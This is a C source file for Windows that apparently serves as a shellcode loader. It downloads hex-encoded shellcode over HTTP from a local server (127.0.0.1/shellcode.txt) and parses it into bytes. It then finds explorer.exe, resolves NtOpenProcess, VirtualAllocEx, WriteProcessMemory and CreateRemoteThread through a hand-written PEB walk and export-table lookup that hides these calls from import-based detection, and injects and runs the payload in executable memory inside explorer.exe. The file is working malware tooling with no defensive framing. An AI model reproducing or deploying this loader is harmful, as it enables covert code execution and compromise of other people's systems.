#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <winhttp.h>
#include <winternl.h>

PPEB getPeb() {
    #if _WIN64
        return (PPEB)__readgsqword(0x60);
    #else
        return (PPEB)__readfsdword(0x30);
    #endif
}

PVOID getModuleHandleCustom(PCWSTR moduleName)
{
    PLDR_DATA_TABLE_ENTRY Ldr = NULL;
    PLIST_ENTRY Ent = NULL;
    PLIST_ENTRY Head = NULL;
    PPEB Peb = getPeb();

    Ent = &Peb->Ldr->InMemoryOrderModuleList;
    Head = Ent;
    Ent = Ent->Flink;

    do
    {
        Ldr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Ent - 0x10);

        if (lstrcmpiW((LPCWSTR)*(Ldr->Reserved5), moduleName) == 0)
        {
            return Ldr->DllBase;
        }

        Ent = Ent->Flink;

    } while (Head != Ent);
    return NULL;
}

PVOID getProcAddressCustom(PVOID moduleHandle, PCSTR procName)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosHeader + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addressOfFunctions = (PDWORD)((PBYTE)dosHeader + exportDirectory->AddressOfFunctions);
    PDWORD addressOfNames = (PDWORD)((PBYTE)dosHeader + exportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinals = (PWORD)((PBYTE)dosHeader + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++)
    {
        if (lstrcmpA((LPCSTR)((PBYTE)dosHeader + addressOfNames[i]), procName) == 0)
        {
            return (PVOID)((PBYTE)dosHeader + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }
    return NULL;
}

DWORD GetProcessID(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (strcmp(processName, pe32.szExeFile) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"Mozilla/5.0",WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession){
        hConnect = WinHttpConnect(hSession, L"127.0.0.1",INTERNET_DEFAULT_HTTP_PORT, 0);
    }

    if (hConnect){
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/shellcode.txt",NULL, WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
    }

    if (hRequest){
        WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0, WINHTTP_NO_REQUEST_DATA, 0,0, 0);
        WinHttpReceiveResponse(hRequest, NULL);
    }

    char web_shellcode[2048];
    ZeroMemory(web_shellcode, sizeof(web_shellcode));

    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            printf("Error in WinHttpQueryDataAvailable.\n");

        if (!WinHttpReadData(hRequest, (LPVOID)web_shellcode, sizeof(web_shellcode), &dwDownloaded))
            printf("Error in WinHttpReadData.\n");
    } while (dwSize > 0);

    // Nettoyage
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    unsigned char shellcode[2048];
    int index = 0;

    for (int i = 0; i < strlen(web_shellcode); i++) {
        if (web_shellcode[i] == '\\' && web_shellcode[i+1] == 'x') {
            unsigned char value;
            int tempValue;
            sscanf(web_shellcode + i + 2, "%2x", &tempValue);
            value = (unsigned char)tempValue;
            shellcode[index++] = value;

            i += 3;
        }
    }

    DWORD processID = GetProcessID("explorer.exe");

    if (!processID) {
        printf("Process not found.\n");
        return 1;
    }

    PVOID nthandle = getModuleHandleCustom(L"ntdll.dll");
    PVOID kernelhandle = getModuleHandleCustom(L"kernel32.dll");

    PVOID ntproc = getProcAddressCustom(nthandle, "NtOpenProcess");
    typedef NTSTATUS(NTAPI* NtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
    NtOpenProcess MyOpenProcess = (NtOpenProcess)ntproc;

    PVOID vaproc = getProcAddressCustom(kernelhandle, "VirtualAllocEx");
    typedef LPVOID(WINAPI* VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    VirtualAllocEx MyVirtualAllocEx = (VirtualAllocEx)vaproc;

    PVOID wrproc = getProcAddressCustom(kernelhandle, "WriteProcessMemory");
    typedef BOOL(WINAPI* WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
    WriteProcessMemory MyWriteProcessMemory = (WriteProcessMemory)wrproc;

    PVOID crproc = getProcAddressCustom(kernelhandle, "CreateRemoteThread");
    typedef HANDLE(WINAPI* CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
    CreateRemoteThread MyCreateRemoteThread = (CreateRemoteThread)crproc;


    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(uintptr_t)processID;
    cid.UniqueThread = NULL;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    NTSTATUS status = MyOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
    if (status != 0) {
        printf("Process opening failed.\n");
        return 1;
    }

    LPVOID pRemoteCode = MyVirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemoteCode) {
        printf("Allocating memory failed.\n");
        CloseHandle(hProcess);
        return 1;
    }

    if (!MyWriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL)) {
        printf("Writing to process memory failed.\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = MyCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (!hThread) {
        printf("Thread creation failed.\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}